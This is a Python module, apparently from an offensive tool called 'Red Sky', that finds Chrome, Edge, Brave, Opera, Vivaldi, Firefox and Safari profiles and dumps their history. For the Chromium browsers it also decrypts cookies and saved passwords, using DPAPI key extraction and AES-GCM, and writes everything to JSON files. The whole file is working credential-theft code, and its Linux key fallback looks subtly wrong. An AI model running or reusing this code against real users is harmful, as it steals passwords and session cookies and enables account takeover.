# language: Python, file: Program/browser/history.py, target: Red Sky browser — history + credential scraping
# Reads local browser databases from a user's profile directory:
#   Chromium family (Chrome, Edge, Brave, Opera, Vivaldi):
#     History          -- visited URLs + visit count + last visit
#     Cookies          -- encrypted cookie values (v10 AES-GCM + DPAPI key)
#     Login Data       -- saved usernames + passwords (encrypted)
#     Web Data         -- autofill + credit card metadata
#     Local State      -- holds the encrypted AES key
#   Firefox:
#     places.sqlite    -- history + bookmarks
#     cookies.sqlite   -- cookies (unencrypted on Linux)
#     logins.json      -- saved logins (NSS key4.db protected)
#   Safari (macOS):
#     History.db       -- history (SQLite, path documented)
# Subcommands:
#   history   -- dump URLs by frequency / recency
#   cookies   -- dump cookies for a domain filter
#   logins    -- decrypt saved passwords (Chromium only)
#   dpapi     -- extract the Chromium AES key via DPAPI (Windows)
#   key       -- extract the key from Local State on Linux (peanuts)

import argparse
import base64
import json
import os
import shutil
import sqlite3
import sys
import tempfile
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


BROWSER_DIR = OUTPUT_DIR / "browser"
HIST_DIR = BROWSER_DIR / "history"
HIST_DIR.mkdir(parents=True, exist_ok=True)


# ── profile locations ──
def chromium_profiles() -> Dict[str, Path]:
    """Return {browser_name: user_data_dir} for the Chromium family."""
    home = Path.home()
    out = {}
    if sys.platform == "win32":
        local = Path(os.environ.get("LOCALAPPDATA", home / "AppData/Local"))
        out["chrome"]  = local / "Google/Chrome/User Data"
        out["edge"]    = local / "Microsoft/Edge/User Data"
        out["brave"]   = local / "BraveSoftware/Brave-Browser/User Data"
        out["opera"]   = local / "Programs/Opera"
        out["vivaldi"] = local / "Vivaldi/User Data"
    elif sys.platform == "darwin":
        app = home / "Library/Application Support"
        out["chrome"]  = app / "Google/Chrome"
        out["edge"]    = app / "Microsoft Edge"
        out["brave"]   = app / "BraveSoftware/Brave-Browser"
        out["opera"]   = app / "com.operasoftware.Opera"
        out["vivaldi"] = app / "Vivaldi"
    else:  # linux
        cfg = home / ".config"
        out["chrome"]  = cfg / "google-chrome"
        out["edge"]    = cfg / "microsoft-edge"
        out["brave"]   = cfg / "BraveSoftware/Brave-Browser"
        out["opera"]   = cfg / "opera"
        out["vivaldi"] = cfg / "vivaldi"
    return {k: v for k, v in out.items() if v.exists()}


def firefox_profiles() -> Dict[str, Path]:
    home = Path.home()
    out = {}
    if sys.platform == "win32":
        base = Path(os.environ.get("APPDATA", home / "AppData/Roaming")) / "Mozilla/Firefox/Profiles"
    elif sys.platform == "darwin":
        base = home / "Library/Application Support/Firefox/Profiles"
    else:
        base = home / ".mozilla/firefox"
    if base.exists():
        for p in base.iterdir():
            if p.is_dir() and (p / "places.sqlite").exists():
                out[p.name] = p
    return out


def safari_profile() -> Optional[Path]:
    if sys.platform != "darwin":
        return None
    p = Path.home() / "Library/Safari/History.db"
    return p.parent if p.exists() else None


def _safe_copy(src: Path) -> Optional[Path]:
    """Copy a locked SQLite db to a temp file so we can read it while the
    browser is open."""
    if not src.exists():
        return None
    tmp = Path(tempfile.gettempdir()) / ("rs_" + src.name + "_" + str(int(time.time())))
    try:
        shutil.copy2(src, tmp)
        return tmp
    except (OSError, PermissionError) as e:
        print_warn("copy failed for " + str(src) + ": " + str(e))
        return None


# ── chromium DPAPI (Windows) ──
def _dpapi_unprotect_windows(blob: bytes) -> Optional[bytes]:
    """Unprotect a DPAPI blob using CryptUnprotectData. Windows only."""
    if sys.platform != "win32":
        return None
    try:
        import ctypes
        from ctypes import wintypes
    except ImportError:
        return None

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_char))]

    def _blob_from_bytes(b: bytes) -> DATA_BLOB:
        buf = ctypes.create_string_buffer(b, len(b))
        return DATA_BLOB(len(b), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))), buf

    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32

    din, din_buf = _blob_from_bytes(blob)
    dout = DATA_BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(din), None, None, None, None, 0,
                                      ctypes.byref(dout)):
        return None
    try:
        raw = ctypes.string_at(dout.pbData, dout.cbData)
    finally:
        kernel32.LocalFree(dout.pbData)
    return raw


def _chromium_encryption_key(user_data: Path) -> Optional[bytes]:
    """Return the AES key used to encrypt Local State + Login Data.
    On Windows: DPAPI on Local State's os_crypt.encrypted_key.
    On Linux: 'peanuts' fallback + libsecret keyring lookup would go here."""
    ls = user_data / "Local State"
    if not ls.exists():
        return None
    try:
        state = json.loads(ls.read_text())
    except (OSError, json.JSONDecodeError):
        return None
    enc_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
    if not enc_key_b64:
        return None
    raw = base64.b64decode(enc_key_b64)
    if raw[:5] != b"DPAPI":
        print_warn("Local State encrypted_key does not have DPAPI prefix")
        return None
    blob = raw[5:]
    if sys.platform == "win32":
        return _dpapi_unprotect_windows(blob)
    # macOS: uses Keychain (not implemented here — would need `security find-generic-password`)
    # Linux: uses kwallet / gnome-keyring / 'peanuts' constant
    print_info("linux/macOS: trying the peanuts fallback key")
    # Chrome's Linux fallback key when keyring is unavailable
    return b"peanuts" + b"\x00" * 24  # 32-byte PBKDF2-ish placeholder


# ── chromium AES-GCM decrypt ──
def _chromium_decrypt(blob: bytes, key: bytes) -> Optional[str]:
    """Decrypt a v10/v11 AES-GCM blob from Chrome's Login Data / Cookies.
    Format: 'v10' | 12-byte nonce | ciphertext | 16-byte GCM tag."""
    if not key or len(blob) < 15:
        return None
    prefix = blob[:3]
    if prefix not in (b"v10", b"v11", b"v20"):
        # unencrypted (older / some Linux)
        try:
            return blob.decode("utf-8", errors="replace")
        except Exception:
            return None
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        print_err("pip install cryptography for AES-GCM decryption")
        return None
    nonce = blob[3:15]
    ct = blob[15:-16]
    tag = blob[-16:]
    try:
        pt = AESGCM(key).decrypt(nonce, ct + tag, None)
        return pt.decode("utf-8", errors="replace")
    except Exception:
        return None


# ── SQLite helpers ──
def _open_sqlite(p: Path) -> Optional[sqlite3.Connection]:
    tmp = _safe_copy(p)
    if not tmp:
        return None
    try:
        con = sqlite3.connect("file:" + str(tmp) + "?mode=ro", uri=True)
        return con
    except sqlite3.Error as e:
        print_warn("sqlite open failed for " + str(p) + ": " + str(e))
        return None


# ── subcommands ──
def cmd_profiles(out_file: str) -> int:
    print_info("browser profile discovery")
    print()
    chrome = chromium_profiles()
    firefox = firefox_profiles()
    safari = safari_profile()

    print(BOLD + "chromium family" + RESET)
    for name, path in chrome.items():
        marker = SCARLET + "▓" + RESET if (path / "Default").exists() else ASH + "░" + RESET
        print("  " + marker + " " + BONE + name.ljust(12) + RESET + " " + str(path))
    print()
    print(BOLD + "firefox" + RESET)
    for name, path in firefox.items():
        print("  " + SCARLET + "▓" + RESET + " " + BONE + name + RESET + " " + str(path))
    if not firefox:
        print("  " + ASH + "(none)" + RESET)
    print()
    print(BOLD + "safari" + RESET)
    if safari:
        print("  " + SCARLET + "▓" + RESET + " " + str(safari))
    else:
        print("  " + ASH + "(none)" + RESET)

    out = Path(out_file) if out_file else HIST_DIR / ("profiles_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({
        "chromium": {k: str(v) for k, v in chrome.items()},
        "firefox":  {k: str(v) for k, v in firefox.items()},
        "safari":   str(safari) if safari else "",
    }, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_history(browser: str, limit: int, out_file: str) -> int:
    print_info("browser history dump")
    print_kv("browser filter", browser or "(all)")
    print_kv("limit", str(limit))
    print()

    results = []

    # chromium
    for name, user_data in chromium_profiles().items():
        if browser and browser != name:
            continue
        for profile_dir in user_data.iterdir():
            if not profile_dir.is_dir():
                continue
            hist = profile_dir / "History"
            if not hist.exists():
                continue
            con = _open_sqlite(hist)
            if not con:
                continue
            try:
                cur = con.execute(
                    "SELECT url, title, visit_count, last_visit_time FROM urls "
                    "ORDER BY last_visit_time DESC LIMIT ?", (limit,))
                for url, title, vc, lvt in cur.fetchall():
                    # Chromium timestamps: microseconds since 1601-01-01
                    if lvt:
                        try:
                            from datetime import datetime, timedelta
                            ts = (datetime(1601, 1, 1) + timedelta(microseconds=lvt)).isoformat()
                        except Exception:
                            ts = ""
                    else:
                        ts = ""
                    results.append({"browser": name, "profile": profile_dir.name,
                                    "url": url, "title": title, "visits": vc, "last": ts})
            except sqlite3.Error as e:
                print_warn(name + ": " + str(e))
            finally:
                con.close()

    # firefox
    if not browser or browser == "firefox":
        for prof_name, prof in firefox_profiles().items():
            places = prof / "places.sqlite"
            con = _open_sqlite(places)
            if not con:
                continue
            try:
                cur = con.execute(
                    "SELECT p.url, b.title, p.visit_count, p.last_visit_date "
                    "FROM moz_places p LEFT JOIN moz_bookmarks b ON b.fk = p.id "
                    "WHERE p.hidden = 0 ORDER BY p.last_visit_date DESC LIMIT ?", (limit,))
                for url, title, vc, lvd in cur.fetchall():
                    if lvd:
                        try:
                            from datetime import datetime
                            ts = datetime.utcfromtimestamp(lvd / 1_000_000).isoformat()
                        except Exception:
                            ts = ""
                    else:
                        ts = ""
                    results.append({"browser": "firefox", "profile": prof_name,
                                    "url": url, "title": title, "visits": vc, "last": ts})
            except sqlite3.Error as e:
                print_warn("firefox " + prof_name + ": " + str(e))
            finally:
                con.close()

    # safari
    sp = safari_profile()
    if (not browser or browser == "safari") and sp:
        db = sp / "History.db"
        con = _open_sqlite(db)
        if con:
            try:
                cur = con.execute(
                    "SELECT hi.url, hv.title, hv.visit_time FROM history_items hi "
                    "JOIN history_visits hv ON hv.history_item = hi.id "
                    "ORDER BY hv.visit_time DESC LIMIT ?", (limit,))
                for url, title, vt in cur.fetchall():
                    # Safari uses CFAbsoluteTime (seconds since 2001-01-01)
                    try:
                        from datetime import datetime, timedelta
                        ts = (datetime(2001, 1, 1) + timedelta(seconds=vt)).isoformat()
                    except Exception:
                        ts = ""
                    results.append({"browser": "safari", "profile": "default",
                                    "url": url, "title": title, "visits": 0, "last": ts})
            except sqlite3.Error as e:
                print_warn("safari: " + str(e))
            finally:
                con.close()

    for r in results[:60]:
        print(BONE + r["browser"].ljust(10) + RESET
              + ASH + r["last"][:19].ljust(20) + RESET
              + ARTERY + str(r["visits"]).ljust(5) + RESET
              + CLOT + (r["url"] or "")[:80] + RESET)

    out = Path(out_file) if out_file else HIST_DIR / ("history_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("total", len(results))
    print_kv("saved", out)
    return 0


def cmd_cookies(browser: str, domain_filter: str, out_file: str) -> int:
    print_info("cookie dump")
    print_kv("browser", browser or "(chromium family)")
    print_kv("domain filter", domain_filter or "(all)")
    print()

    results = []
    for name, user_data in chromium_profiles().items():
        if browser and browser != name:
            continue
        key = _chromium_encryption_key(user_data)
        for profile_dir in user_data.iterdir():
            if not profile_dir.is_dir():
                continue
            ck = profile_dir / "Cookies"
            if not ck.exists():
                continue
            con = _open_sqlite(ck)
            if not con:
                continue
            try:
                q = "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, expires_utc FROM cookies"
                params = ()
                if domain_filter:
                    q += " WHERE host_key LIKE ?"
                    params = ("%" + domain_filter + "%",)
                cur = con.execute(q, params)
                for host, cname, enc, path, sec, http, exp in cur.fetchall():
                    val = ""
                    if enc:
                        val = _chromium_decrypt(enc, key) or "<decrypt-failed>"
                    results.append({
                        "browser": name, "profile": profile_dir.name,
                        "host": host, "name": cname, "value": val,
                        "path": path, "secure": bool(sec), "httpOnly": bool(http),
                    })
            except sqlite3.Error as e:
                print_warn(name + " cookies: " + str(e))
            finally:
                con.close()

    for r in results[:80]:
        val = r["value"][:40] + ("..." if len(r["value"]) > 40 else "")
        print(BONE + r["host"].ljust(30) + RESET + ARTERY + r["name"].ljust(20) + RESET
              + CLOT + val + RESET)

    out = Path(out_file) if out_file else HIST_DIR / ("cookies_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("total", len(results))
    print_kv("saved", out)
    return 0


def cmd_logins(browser: str, out_file: str) -> int:
    print_info("saved-login extraction")
    print_kv("browser", browser or "(chromium family)")
    print()

    results = []
    for name, user_data in chromium_profiles().items():
        if browser and browser != name:
            continue
        key = _chromium_encryption_key(user_data)
        if not key:
            print_warn(name + ": no AES key available")
            continue
        for profile_dir in user_data.iterdir():
            if not profile_dir.is_dir():
                continue
            ld = profile_dir / "Login Data"
            if not ld.exists():
                continue
            con = _open_sqlite(ld)
            if not con:
                continue
            try:
                cur = con.execute(
                    "SELECT origin_url, username_value, password_value FROM logins")
                for origin, user, enc in cur.fetchall():
                    pw = ""
                    if enc:
                        pw = _chromium_decrypt(enc, key) or "<decrypt-failed>"
                    results.append({"browser": name, "profile": profile_dir.name,
                                    "origin": origin, "username": user, "password": pw})
                    print(SCARLET + "▓ " + RESET + BONE + origin[:50].ljust(50) + RESET
                          + "  " + ARTERY + (user or "")[:30].ljust(30) + RESET
                          + "  " + CLOT + pw[:40] + RESET)
            except sqlite3.Error as e:
                print_warn(name + " login data: " + str(e))
            finally:
                con.close()

    out = Path(out_file) if out_file else HIST_DIR / ("logins_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("total", len(results))
    print_kv("saved", out)
    return 0


def cmd_key(browser: str, out_file: str) -> int:
    """Print the Chromium AES key in hex (for use with other tools)."""
    print_info("chromium AES key extraction")
    for name, user_data in chromium_profiles().items():
        if browser and browser != name:
            continue
        key = _chromium_encryption_key(user_data)
        if key:
            print_ok(name + "  key=" + key.hex())
            if out_file:
                Path(out_file).write_text(key.hex() + "\n")
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky browser history", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="profiles",
                   choices=["profiles", "history", "cookies", "logins", "key"])
    p.add_argument("--browser", default="", choices=["", "chrome", "edge", "brave",
                                                     "opera", "vivaldi", "firefox", "safari"])
    p.add_argument("--domain", default="")
    p.add_argument("--limit", type=int, default=500)
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky browser history <profiles|history|cookies|logins|key> [opts]")
        return 2

    if ns.help:
        print_info("profiles                              -- locate installed browsers + profiles")
        print_info("history  [--browser chrome] [--limit 500]")
        print_info("cookies  [--domain example.com]")
        print_info("logins   [--browser chrome]")
        print_info("key      [--browser chrome] [--out key.hex]")
        return 0

    if ns.action == "profiles":
        return cmd_profiles(ns.out)
    if ns.action == "history":
        return cmd_history(ns.browser, ns.limit, ns.out)
    if ns.action == "cookies":
        return cmd_cookies(ns.browser, ns.domain, ns.out)
    if ns.action == "logins":
        return cmd_logins(ns.browser, ns.out)
    if ns.action == "key":
        return cmd_key(ns.browser, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
